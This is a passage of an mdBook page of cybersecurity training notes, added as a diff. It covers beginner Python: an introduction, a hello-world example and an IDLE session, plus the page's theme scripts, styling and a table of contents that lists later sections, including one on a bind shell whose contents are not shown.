@@ -1,0 +1,1367 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Python - Cybersecurity Notes</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../../theme/pagetoc.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Cybersecurity Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<ul>
+<li><a href="#python">Python</a>
+<ul>
+<li><a href="#intro">Intro</a>
+<ul>
+<li><a href="#executing-python-code">Executing Python Code</a>
+<ul>
+<li><a href="#idle">IDLE</a></li>
+<li><a href="#shebang-">Shebang #!</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#variables">Variables</a>
+<ul>
+<li><a href="#strings">Strings</a></li>
+<li><a href="#format-strings">Format Strings</a></li>
+<li><a href="#integers">Integers</a></li>
+<li><a href="#booleans">Booleans</a></li>
+<li><a href="#comments">Comments</a></li>
+</ul>
+</li>
+<li><a href="#coding-style">Coding Style</a></li>
+<li><a href="#conditional-statements--loops">Conditional Statements / Loops</a>
+<ul>
+<li><a href="#if-elif-else">if-(elif)-else</a></li>
+<li><a href="#while">while</a></li>
+<li><a href="#for-each-loop">for-each-loop</a></li>
+</ul>
+</li>
+<li><a href="#functions">Functions</a>
+<ul>
+<li><a href="#function-call">Function Call</a></li>
+</ul>
+</li>
+<li><a href="#oop">OOP</a></li>
+<li><a href="#libraries">Libraries</a>
+<ul>
+<li><a href="#managing-libraries">Managing Libraries</a></li>
+<li><a href="#importance-of-libraries">Importance of Libraries</a>
+<ul>
+<li><a href="#requests">requests</a></li>
+<li><a href="#beautifulsoup">BeautifulSoup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#project-word-extractor">Project: Word Extractor</a>
+<ul>
+<li><a href="#word-extractor-improvements">Word Extractor Improvements</a>
+<ul>
+<li><a href="#main-block">main-Block</a></li>
+<li><a href="#accepting-arguments">Accepting Arguments</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#project-simple-bind-shell">Project: Simple Bind Shell</a></li>
+<li><a href="#advanced-libraries">Advanced Libraries</a>
+<ul>
+<li><a href="#directories-and-search-paths">Directories and Search Paths</a></li>
+<li><a href="#venv">venv</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="python"><a class="header" href="#python">Python</a></h1>
+<p>Python is an interpreted language, which means the code itself is not compiled into machine code like C code. Instead, it is interpreted by the Python program, and the instructions in the script(s) are executed. Python is a high-level language meaning the scripts you produce are simplified for your convenience so that you don't need to worry about memory management, system calls, and so forth. Furthermore, Python is a general-purpose, multi-paradigm language.</p>
+<h2 id="intro"><a class="header" href="#intro">Intro</a></h2>
+<h3 id="executing-python-code"><a class="header" href="#executing-python-code">Executing Python Code</a></h3>
+<p>There are many ways to execute a piece of Python code. Two of the most frequently used methods are running the code from a <code>.py</code> file and running it directly inside the Python IDLE. The file-based way is handy when developing an actual script and the IDLE way is very useful for quickly testing something small.</p>
+<p>Basic example:</p>
+<pre><code class="language-python">print("Hello Academy!")
+</code></pre>
+<p>Terminal usage example:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ vim welcome.py
+d41y@htb[/htb]$ python3 welcome.py
+
+Hello Academy!
+</code></pre>
+<h4 id="idle"><a class="header" href="#idle">IDLE</a></h4>
+<p>You can use IDLE directly in your terminal for quicker prototyping. You can launch this by executing the Python binary without any arguments.</p>
+<p>Example:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python3
+
+Python 3.9.0 (default, Oct 27 2020, 14:15:17) 
+[Clang 12.0.0 (clang-1200.0.32.21)] on darwin
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; 4 + 3
+7
+&gt;&gt;&gt; foo = 3 * 5
+&gt;&gt;&gt; foo
+15
+&gt;&gt;&gt; foo + 4
+19
